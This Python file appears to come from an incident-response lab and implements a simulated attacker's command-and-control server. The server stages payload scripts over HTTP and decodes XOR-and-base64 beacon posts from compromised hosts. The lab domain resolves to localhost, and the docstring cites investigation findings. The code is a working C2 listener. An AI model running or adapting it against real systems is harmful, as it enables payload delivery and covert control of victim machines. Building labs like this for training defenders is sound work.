"""
c2_server.py -- the attacker's command & control listener.

The domain cdn-sync-eu.net was registered on 18 February 2027 (F31), twelve
days before the first tampered build. Beacons arrive as small encrypted-looking
POST bodies at a 47 hour cadence (F25). In this lab the domain stub-resolves to
127.0.0.1 (see common.py), so the beacons travel over real sockets while every
log on the customer side records the domain name.
"""

import base64
import os
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import common

PORT = 19090  # in the real world: 443 behind some cheap CDN


class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        # payload staging: the attacker serves their tooling from the same box
        u = urlparse(self.path)
        if u.path.startswith("/payloads/"):
            name = os.path.basename(u.path)
            p = os.path.join(common.ATTACKER_DIR, name)
            if os.path.exists(p):
                self.send_response(200)
                data = open(p, "rb").read()
                self.send_header("Content-Type", "text/x-python")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
                return
        self.send_response(404)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_POST(self):
        u = urlparse(self.path)
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        if u.path == "/beacon":
            # "encrypted" small payload -- XOR + base64, enough to look opaque
            raw = base64.b64decode(body)
            plain = bytes(b ^ 0x5A for b in raw)
            with open(os.path.join(common.ATTACKER_DIR, "beacons.log"), "a") as f:
                f.write(f"{common.ts()} | beacon received | {len(body)} bytes | host-tag={plain[:40]!r}\n")
            self.send_response(200)
            self.send_header("Content-Length", "2")
            self.end_headers()
            self.wfile.write(b"ok")
        else:
            self.send_response(404)
            self.send_header("Content-Length", "0")
            self.end_headers()


def serve(port=PORT):
    httpd = ThreadingHTTPServer(("0.0.0.0", port), C2Handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd


if __name__ == "__main__":
    httpd = serve()
    print(f"C2 listener on 0.0.0.0:{PORT}  (domain {common.ATTACKER_DOMAIN})")
    try:
        threading.Event().wait()
    except KeyboardInterrupt:
        httpd.shutdown()
